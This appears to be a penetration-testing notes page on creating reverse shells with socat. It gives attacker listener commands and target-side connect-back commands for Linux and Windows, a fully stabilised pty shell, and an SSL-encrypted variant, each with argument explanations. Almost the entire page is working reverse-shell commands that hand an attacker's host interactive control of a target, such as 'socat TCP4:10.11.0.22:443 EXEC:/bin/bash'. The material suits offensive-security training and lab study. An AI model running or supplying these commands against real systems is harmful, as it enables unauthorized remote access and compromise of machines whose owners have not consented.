---
description: Creating reverse shells with Socat
---

# Socat

## Basic Reverse Shell

The simplest reverse shell closely mimics the functionality and structure of Netcat.

For all of these techniques it is assumed that there is a working copy of socat installed on the target machine (in order to make connections back).

If socat is not already installed it is possible to utilize a compiled binary which must be placed on the target machine.

* Static pre-compiled socat binary can be [downloaded](https://github.com/andrew-d/static-binaries)

### Attacking Machine

```powershell
C:\Users\offsec> socat -d -d TCP4-LISTEN:443 STDOUT
... socat[4388] N listening on AF=2 0.0.0.0:443
```

| Argument            | Description                                          |
| ------------------- | ---------------------------------------------------- |
| `-d -d`             | Increase verbosity                                   |
| `TCP-LISTEN:{PORT}` | Declare a listener at `{PORT}`                       |
| `STDOUT`            | Connect standard output (`STDOUT`) to the TCP socket |

### Target Machine

#### Linux Target

```bash
kali@kali:~$ socat TCP4:10.11.0.22:443 EXEC:/bin/bash
```

| Argument           | Description                                                                                        |
| ------------------ | -------------------------------------------------------------------------------------------------- |
| `TCP4:{IP}:{PORT}` | Specify the location to reach out                                                                  |
| `EXEC:{PATH}`      | <p>Specifies an executable to pipe socat into.<br><br>Similar to netcat's <code>-e</code> flag</p> |

#### Windows Target:

<pre class="language-powershell"><code class="lang-powershell"><strong>C:\Users\offsec> socat TCP:0{IP}:{PORT} EXEC:powershell.exe,pipes</strong></code></pre>

* `pipes` option is used to force powershell (or `cmd.exe`) to use Unix style standard input and output

## Stabilization Techniques

### Fully Stable Shell (Linux Only)

Technique for creating a fully stable shell on Linux target system only (Attacking machine can be any operating system with socat installed).

Attacker Machine:

```bash
$ socat TCP-L:{PORT} FILE:`tty`,raw,echo=0
```

Target Machine:

{% code overflow="wrap" %}
```bash
$ socat TCP4:{Listen-IP}:{Listen-PORT} EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```
{% endcode %}

| Argument          | Description                                                                                                                                                                            |
| ----------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `EXEC:"bash -li"` | <p>Creates an interactive bash session (arguments and purpose listed below).<br><br><code>-li</code> flag launches an <em>interactive</em> shell in <em>login</em> invocation mode</p> |
| `pty`             | Allocates a pseudo-terminal on the target                                                                                                                                              |
| `stderr`          | Makes sure that any error messages get shown in the shell (often a problem with non-interactive shells)                                                                                |
| `sigint`          | Passes any `Ctrl + C` commands through into the sub-process, allowing users to kill commands inside the shell                                                                          |
| `setsid`          | Creates the process in a new session                                                                                                                                                   |
| `sane`            | Stabilizes the terminal, attempting to "normalize" it.                                                                                                                                 |

## Encrypted Shell

The process for generating the SSL certificate is the same as in the bind shell.

### Shell Creation

Once the cert is generated (on the attacker's machine in this case) the shell can be created.

#### Attacker Machine

First the listener should be opened on the attacker machine:

```bash
kali@kali:~$ socat OPENSSL-LISTEN:{PORT},cert=shell.pem,verify=0 -
```

* `verify=0` tells the connection to not bother trying to validate that our certificate has been properly signed by a recognized authority

#### Target Machine

Then the target machine can be induced to call out to the listener:

```bash
user@target:~$ socat OPENSSL:{IP}:{PORT},verify=0 EXEC:/bin/bash
```

